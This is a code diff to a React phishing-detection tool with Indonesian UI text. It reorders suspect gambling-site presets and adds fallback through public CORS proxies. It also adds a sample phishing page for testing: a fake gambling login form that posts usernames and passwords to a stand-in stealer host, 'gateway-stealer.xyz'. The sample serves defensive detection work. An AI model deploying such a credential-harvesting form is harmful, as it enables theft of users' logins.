@@ -117,19 +117,9 @@ export const PhisingChecker: React.FC = () => {
   // Quick preset domains
   const PRESET_DOMAINS = [
     { 
-      name: '🚨 coletivomission.com (Bigo 4D Spacing)', 
-      url: 'https://coletivomission.com', 
-      hint: 'Varian: bigo 4d, bigo 4 d, bigo 4d login' 
-    },
-    { 
       name: '🚨 curacaoexport/gallery/ (ZEUS711)', 
       url: 'https://curacaoexport.vladesigns.com/gallery/index.html', 
       hint: 'Index Google: Phising Zeus711' 
-    },
-    { 
-      name: '🌐 curacaoexport (Root Domain)', 
-      url: 'https://curacaoexport.vladesigns.com', 
-      hint: 'Deteksi Sitemap Cloaking Google' 
     },
     { 
       name: '🔥 circuit-mornay.fr (Zeus711)', 
@@ -137,11 +127,60 @@ export const PhisingChecker: React.FC = () => {
       hint: 'Target Zeus711' 
     },
     { 
+      name: '🌐 curacaoexport (Root Cloaking)', 
+      url: 'https://curacaoexport.vladesigns.com', 
+      hint: 'Deteksi Sitemap Cloaking Google' 
+    },
+    { 
       name: 'Google.com', 
       url: 'https://google.com', 
       hint: 'Contoh Bersih' 
     }
   ];
+
+  // Realistic sample script for quick staff testing in Mode 2
+  const SAMPLE_PHISHING_HTML = `<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>ZEUS711: Link Alternatif Resmi Login & Daftar Zeus 711 Slot Gacor Hari Ini</title>
+  <meta name="description" content="Situs judi online resmi Zeus711, Bigo 4D, dan Sempoa4D terpercaya dengan bonus new member 100% dan jackpot terbesar.">
+  <meta name="keywords" content="zeus711, zeus 711, bigo 4d, bigo4d, sempoa4d, slot gacor, togel online, donisko">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebPage",
+    "name": "Login Zeus711 Slot Gacor & Togel Bigo 4D",
+    "url": "https://zeus711-resmi.vip"
+  }
+  </script>
+</head>
+<body class="bg-black text-white">
+  <header>
+    <h1>SELAMAT DATANG DI SITUS RESMI ZEUS 711 & BIGO 4D</h1>
+    <nav>
+      <a href="https://t.me/fake_livechat_711">Hubungi LiveChat Zeus711</a>
+    </nav>
+  </header>
+  <main>
+    <div class="login-box">
+      <h2>FORM LOGIN AKUN MEMBER</h2>
+      <!-- Indikasi Phising: Action mengarah ke domain pencuri data asing -->
+      <form action="https://gateway-stealer.xyz/harvest-account.php" method="POST">
+        <input type="text" name="username" placeholder="Masukkan Username Anda" required>
+        <input type="password" name="password" placeholder="Masukkan Password Akun" required>
+        <button type="submit">MASUK SEKARANG</button>
+      </form>
+    </div>
+  </main>
+  <script>
+    // Phishing credential theft & clickjacking redirect
+    window.addEventListener('submit', function() {
+      console.log('Mencuri data member...');
+    });
+  </script>
+</body>
+</html>`;
 
   const handleInspect = async (overrideUrl?: string) => {
     const target = (overrideUrl || urlInput).trim();
@@ -167,11 +206,17 @@ export const PhisingChecker: React.FC = () => {
           })
         });
 
-        const json = await res.json();
-        if (res.ok && json.success) {
-          data = json;
+        const contentType = res.headers.get('content-type') || '';
+        if (contentType.includes('application/json')) {
+          const json = await res.json();
+          if (res.ok && json.success) {
+            data = json;
+          } else {
+            primaryErr = json.error || `Gagal membaca domain (${res.status})`;
+          }
         } else {
-          primaryErr = json.error || `Gagal membaca domain (${res.status})`;
+          // Jika di-hosting di platform static (Vercel static/Netlify) yang mengembalikan 404 HTML
+          primaryErr = `Server backend API tidak merespons JSON (HTTP ${res.status}). Proyek kemungkinan berjalan dalam mode hosting statis.`;
         }
       } catch (backendFetchErr: any) {
         primaryErr = backendFetchErr.message || 'Server backend tidak dapat dihubungi.';
@@ -179,37 +224,59 @@ export const PhisingChecker: React.FC = () => {
 
       // 2. Jika backend gagal (misal diblokir Cloudflare/WAF hosting atau deployment static), coba fallback via CORS Proxy publik
       if (!data) {
-        try {
-          const proxyTarget = target.startsWith('http') ? target : `https://${target}`;
-          const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(proxyTarget)}`;
-          const proxyRes = await fetch(proxyUrl);
-          
-          if (proxyRes.ok) {
-            const proxyJson = await proxyRes.json();
-            if (proxyJson.contents && proxyJson.contents.length > 50) {
-              data = {
-                success: true,
-                targetUrl: target,
-                finalUrl: proxyTarget,
-                status: proxyJson.status?.http_code || 200,
-                statusText: 'OK (Via Web Proxy Fallback)',
-                responseTimeMs: 650,
-                contentType: 'text/html',
-                contentLength: proxyJson.contents.length,
-                headers: {},
-                html: proxyJson.contents,
-                isHttps: proxyTarget.startsWith('https://'),
-                usedUA: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36'
-              };
+        const proxyTarget = target.startsWith('http') ? target : `https://${target}`;
+        const proxyList = [
+          `https://api.allorigins.win/get?url=${encodeURIComponent(proxyTarget)}`,
+          `https://corsproxy.io/?url=${encodeURIComponent(proxyTarget)}`,
+          `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(proxyTarget)}`
+        ];
+
+        for (const proxyUrl of proxyList) {
+          try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            const proxyRes = await fetch(proxyUrl, { signal: controller.signal });
+            clearTimeout(timeoutId);
+
+            if (proxyRes.ok) {
+              const text = await proxyRes.text();
+              let extractedHtml = '';
+
+              try {
+                const proxyJson = JSON.parse(text);
+                if (proxyJson.contents && typeof proxyJson.contents === 'string') {
+                  extractedHtml = proxyJson.contents;
+                }
+              } catch {
+                extractedHtml = text;
+              }
+
+              if (extractedHtml && extractedHtml.length > 50 && (extractedHtml.includes('<html') || extractedHtml.includes('<body') || extractedHtml.includes('<head') || extractedHtml.includes('<!DOCTYPE'))) {
+                data = {
+                  success: true,
+                  targetUrl: target,
+                  finalUrl: proxyTarget,
+                  status: 200,
+                  statusText: 'OK (Via Web Proxy Fallback)',
+                  responseTimeMs: 800,
+                  contentType: 'text/html',
+                  contentLength: extractedHtml.length,
+                  headers: {},
+                  html: extractedHtml,
+                  isHttps: proxyTarget.startsWith('https://'),
+                  usedUA: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36'
+                };
+                break;
+              }
             }
+          } catch {
+            // Lanjut ke proxy berikutnya
           }
-        } catch {
-          // Proxy fallback tidak berhasil
         }
       }
 
       if (!data) {
-        throw new Error(primaryErr || 'Gagal membaca domain. Target domain mungkin offline atau memblokir koneksi server/crawler.');
+        throw new Error(primaryErr || 'Gagal membaca domain. Target domain memblokir koneksi server/crawler atau hosting tidak mendukung crawler.');
       }
 
       setResult(data);
@@ -735,9 +802,22 @@ ${parsedData.phishingIndicators.map(p => `[${p.severity}] ${p.title} - ${p.desc}
             />
 
             <div className="flex flex-wrap items-center justify-between gap-2">
-              <span className="text-[11px] font-mono text-gray-400">
-                {rawConsoleHtml.length > 0 ? `${rawConsoleHtml.length.toLocaleString()} karakter script siap dianalisa` : 'Tempel kode HTML untuk langsung mengaudit baris phising'}
-              </span>
+              <div className="flex items-center gap-2">
+                <span className="text-[11px] font-mono text-gray-400">
+                  {rawConsoleHtml.length > 0 ? `${rawConsoleHtml.length.toLocaleString()} karakter script siap dianalisa` : 'Tempel kode HTML untuk langsung mengaudit baris phising'}
+                </span>
+                <button
+                  type="button"
+                  onClick={() => {
+                    setRawConsoleHtml(SAMPLE_PHISHING_HTML);
+                    setErrorMsg(null);
+                  }}
+                  className="px-2.5 py-1 rounded-lg bg-yellow-400/15 hover:bg-yellow-400/25 border border-yellow-400/40 text-yellow-300 text-[10px] font-mono font-bold transition-all cursor-pointer flex items-center gap-1"
+                >
+                  <Sparkles className="w-3 h-3 text-yellow-400" />
+                  <span>Isi Contoh Script Demo (1-Klik)</span>
+                </button>
+              </div>
 
               <button
                 type="button"
